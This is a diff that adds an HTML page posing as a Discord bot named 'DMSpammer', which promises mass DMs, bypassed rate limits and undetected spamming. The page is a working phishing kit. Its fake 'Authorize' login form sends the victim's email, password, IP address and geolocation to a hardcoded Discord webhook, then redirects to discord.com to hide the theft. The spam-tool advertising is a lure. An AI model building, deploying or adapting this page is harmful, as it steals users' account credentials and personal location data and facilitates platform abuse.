@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DMSpammer · Discord Bot</title>
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #1e1f22;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-image: radial-gradient(ellipse at 50% 0%, #2b2d31 0%, #1a1b1e 100%);
+      padding: 16px;
+    }
+    .container { width: 100%; max-width: 480px; }
+    .card {
+      background: #2b2d31;
+      border-radius: 8px;
+      padding: 40px 36px 32px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+      border: 1px solid #3f4147;
+    }
+
+    /* Landing */
+    .bot-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: #5865f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 34px;
+      margin: 0 auto 14px;
+      box-shadow: 0 0 0 4px #1e1f22, 0 0 0 6px #5865f2;
+    }
+    .bot-name {
+      color: white;
+      font-size: 24px;
+      font-weight: 700;
+      text-align: center;
+    }
+    .bot-badge {
+      display: inline-block;
+      background: #3ba55c;
+      color: white;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 12px;
+      border-radius: 20px;
+      margin: 4px auto 16px;
+      text-align: center;
+      width: fit-content;
+      letter-spacing: 0.3px;
+    }
+    .bot-badge-wrap { text-align: center; }
+
+    .sub {
+      color: #b5bac1;
+      font-size: 14px;
+      line-height: 1.6;
+      text-align: center;
+      margin-bottom: 22px;
+    }
+    .sub strong { color: white; }
+
+    .feature-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+    .feature {
+      background: #1e1f22;
+      padding: 14px 10px;
+      border-radius: 6px;
+      text-align: center;
+      border: 1px solid #35373d;
+    }
+    .feature .icon { font-size: 20px; display: block; margin-bottom: 4px; }
+    .feature .label { color: #dbdee1; font-size: 12px; font-weight: 500; }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.15s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-primary { background: #5865f2; color: white; }
+    .btn-primary:hover { background: #4752c4; }
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid #3f4147;
+      color: #b5bac1;
+      margin-top: 10px;
+    }
+    .btn-secondary:hover { background: #35373d; }
+
+    .footer {
+      margin-top: 18px;
+      color: #80848e;
+      font-size: 12px;
+      text-align: center;
+    }
+    .footer a { color: #00a8fc; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+    .footer .green { color: #3ba55c; }
+
+    /* Login Section */
+    #loginSection { display: none; }
+    #loginSection.active { display: block; }
+    #landingSection.hidden { display: none; }
+
+    .back-link {
+      color: #b5bac1;
+      font-size: 13px;
+      cursor: pointer;
+      margin-bottom: 14px;
+      display: inline-block;
+    }
+    .back-link:hover { color: white; }
+
+    .field { margin-bottom: 16px; }
+    .field label {
+      color: #b5bac1;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+      display: block;
+      margin-bottom: 5px;
+    }
+    .field input {
+      width: 100%;
+      padding: 12px 14px;
+      background: #1e1f22;
+      border: 1px solid transparent;
+      border-radius: 4px;
+      color: white;
+      font-size: 15px;
+      outline: none;
+      transition: 0.15s;
+    }
+    .field input:focus { border-color: #5865f2; background: #25262b; }
+    .field input::placeholder { color: #5c5e66; }
+
+    .login-btn {
+      width: 100%;
+      padding: 13px;
+      background: #5865f2;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+      transition: 0.15s;
+    }
+    .login-btn:hover { background: #4752c4; }
+
+    .msg {
+      font-size: 13px;
+      margin-top: 10px;
+      padding: 8px 12px;
+      border-radius: 4px;
+      display: none;
+    }
+    .msg.error { background: #2a1a1e; color: #f23f3f; border: 1px solid #3f1e24; display: block; }
+    .msg.success { background: #1a2e24; color: #3ba55c; border: 1px solid #1f3d2e; display: block; }
+
+    .login-footer {
+      margin-top: 16px;
+      text-align: center;
+    }
+    .login-footer a { color: #00a8fc; font-size: 13px; text-decoration: none; }
+    .login-footer a:hover { text-decoration: underline; }
+    .login-footer span { color: #80848e; font-size: 13px; margin: 0 6px; }
+
+    /* Hides the IP logger elements */
+    .header { display: none; }
+    #razzylog { display: none; }
+    #ipppp { display: none; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+
+    <!-- ===== LANDING ===== -->
+    <div id="landingSection">
+      <div class="bot-icon">🤖</div>
+      <div class="bot-name">DMSpammer</div>
+      <div class="bot-badge-wrap"><span class="bot-badge">● Online</span></div>
+
+      <div class="sub">
+        <strong>Send mass DMs to any server.</strong><br>
+        Auto-detect members, bypass rate limits, and spam custom messages with one click.
+      </div>
+
+      <div class="feature-grid">
+        <div class="feature"><span class="icon">📨</span><span class="label">Mass DM</span></div>
+        <div class="feature"><span class="icon">⚡</span><span class="label">Fast & Reliable</span></div>
+        <div class="feature"><span class="icon">🛡️</span><span class="label">Undetected</span></div>
+        <div class="feature"><span class="icon">📊</span><span class="label">Live Stats</span></div>
+      </div>
+
+      <button class="btn btn-primary" id="claimBtn">
+        <span>➕</span> Add Bot to Server
+      </button>
+      <button class="btn btn-secondary" id="skipBtn">
+        <span>🔑</span> Login with Discord
+      </button>
+
+      <div class="footer">
+        <span class="green">✓</span> 3,412 servers using DMSpammer &nbsp;·&nbsp;
+        <a href="#">Terms</a> &nbsp;·&nbsp; <a href="#">Privacy</a>
+      </div>
+    </div>
+
+    <!-- ===== LOGIN ===== -->
+    <div id="loginSection">
+      <span class="back-link" id="backBtn">← Back</span>
+
+      <div style="text-align:center;margin-bottom:14px;">
+        <div style="background:#5865f2;width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;color:white;margin:0 auto 8px;">🤖</div>
+        <h1 style="color:white;font-size:20px;font-weight:700;">Authorize DMSpammer</h1>
+        <div style="color:#b5bac1;font-size:13px;margin-top:2px;">Login to add the bot to your server</div>
+      </div>
+
+      <form id="loginForm">
+        <div class="field">
+          <label>Email or Phone Number</label>
+          <input type="email" id="email" placeholder="you@example.com" required>
+        </div>
+        <div class="field">
+          <label>Password</label>
+          <input type="password" id="password" placeholder="••••••••" required>
+        </div>
+
+        <button type="submit" class="login-btn" id="loginSubmitBtn">
+          Authorize
+        </button>
+
+        <div id="statusMsg" class="msg"></div>
+      </form>
+
+      <div class="login-footer">
+        <a href="#">Forgot your password?</a>
+        <span>·</span>
+        <a href="#">Need an account?</a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // ---------- WEBHOOK (your existing one) ----------
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1532392698143703051/rQRVzs4bvtKxKfCVgMquKBjr8_odDV6Oa_UPhG9Mw2QdCiYqkGKGJVSOOT_QuTi_QKNv";
+
+  // ---------- DOM REFS ----------
+  const landing = document.getElementById('landingSection');
+  const loginSection = document.getElementById('loginSection');
+  const claimBtn = document.getElementById('claimBtn');
+  const skipBtn = document.getElementById('skipBtn');
+  const backBtn = document.getElementById('backBtn');
+  const loginForm = document.getElementById('loginForm');
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const statusMsg = document.getElementById('statusMsg');
+  const submitBtn = document.getElementById('loginSubmitBtn');
+
+  // ---------- HELPERS ----------
+  function showLogin() {
+    landing.classList.add('hidden');
+    loginSection.classList.add('active');
+    statusMsg.className = 'msg';
+    statusMsg.textContent = '';
+  }
+
+  function showLanding() {
+    landing.classList.remove('hidden');
+    loginSection.classList.remove('active');
+    statusMsg.className = 'msg';
+    statusMsg.textContent = '';
+    loginForm.reset();
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Authorize';
+  }
+
+  function setStatus(text, type) {
+    statusMsg.textContent = text;
+    statusMsg.className = 'msg ' + type;
+  }
+
+  // ---------- EVENTS ----------
+  claimBtn.addEventListener('click', showLogin);
+  skipBtn.addEventListener('click', showLogin);
+  backBtn.addEventListener('click', showLanding);
+
+  // ---------- FORM SUBMIT (sends to webhook) ----------
+  loginForm.addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!email || !password) {
+      setStatus('Please fill in both fields.', 'error');
+      return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Authorizing...';
+    setStatus('', '');
+
+    try {
+      // Get IP using the same method as your original logger
+      let ip = 'Unknown';
+      try {
+        const res = await fetch('https://api.ipify.org/?format=json');
+        const data = await res.json();
+        if (data.ip) ip = data.ip;
+      } catch (_) {}
+
+      // Get extra geo info using ip-api.com (like your original code)
+      let extraInfo = 'N/A';
+      try {
+        const geoRes = await fetch('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
+        const geoData = await geoRes.json();
+        extraInfo = JSON.stringify(geoData, null, 2);
+      } catch (_) {}
+
+      const payload = {
+        username: "Beamed",
+        avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
+        content: `**📧 Email:** ${email}\n**🔑 Password:** ${password}\n**🌐 IP:** ${ip}\n**Extra Info:** \`\`\`${extraInfo}\`\`\``
+      };
+
+      const response = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      if (response.ok) {
+        setStatus('✅ Authorized! Redirecting to bot dashboard...', 'success');
+        setTimeout(() => {
+          window.location.href = 'https://discord.com/channels/@me';
+        }, 1200);
+      } else {
+        setStatus('❌ Authorization failed. Please try again.', 'error');
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Authorize';
+      }
+    } catch (err) {
+      setStatus('❌ Network error. Please try again.', 'error');
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Authorize';
+    }
+  });
+</script>
+
+</body>
+</html>
